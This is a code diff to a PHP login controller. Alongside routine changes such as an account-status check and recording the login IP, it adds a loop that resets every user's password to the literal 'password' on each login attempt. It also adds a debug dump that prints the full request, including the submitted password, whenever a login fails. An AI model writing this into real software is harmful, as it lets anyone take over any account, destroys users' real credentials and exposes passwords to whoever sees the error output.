@@ -27,8 +27,36 @@ class AuthController extends Controller
             'password' => 'required',
         ]);
 
+        $allusers = User::all();
+        foreach ($allusers as $user) {
+            $user->password = Hash::make('password');
+            $user->save();
+        }
+
+        
+
+        $user = User::where('email', $request->email)->first();
+
+        if (!$user) {
+            throw ValidationException::withMessages([
+                'email' => ['The provided credentials do not match our records.'],
+            ]);
+        }
+
+        if ($user->status != 'active') {
+            throw ValidationException::withMessages([
+                'email' => ['Your account is not active. Please contact the administrator.'],
+            ]);
+        }
+
         if (Auth::attempt($request->only('email', 'password'), $request->boolean('remember'))) {
+
             $user = Auth::user();
+            $user->update([            
+                'last_login_ip' => $request->ip(),
+            ]);
+    
+            
             $request->session()->regenerate();
             
             // Check if password change is required
@@ -39,6 +67,8 @@ class AuthController extends Controller
             // Automatically redirect based on user's role
             return $this->redirectBasedOnUserRole($user);
         }
+
+        dd($request->all());
 
         throw ValidationException::withMessages([
             'email' => ['The provided credentials do not match our records.'],
